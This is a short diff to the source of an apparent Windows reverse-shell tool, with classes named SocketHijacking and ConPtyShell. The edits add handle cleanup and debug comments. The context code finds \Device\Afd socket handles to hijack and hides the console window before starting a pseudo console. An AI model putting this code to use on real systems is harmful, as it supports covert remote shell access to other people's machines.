@@ -630,12 +630,13 @@ public static class SocketHijacking
                 }
                 catch
                 {
+                    CloseHandle(dupHandle);
                     continue;
                 }
                 if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
                 {
                     strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
-                    // Console.WriteLine("debug: strObjectName " + strObjectName);
+                    // Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
                     if (strObjectName == "\\Device\\Afd")
                         socketsHandles.Add(dupHandle);
                     else
@@ -1299,7 +1300,9 @@ public static class ConPtyShell
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 newConsoleAllocated = true;
             }
+            // debug code for checking handle duplication
             // Console.WriteLine("debug: Creating pseudo console...");
+            // Thread.Sleep(180000);
             // return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if (pseudoConsoleCreationResult != 0)
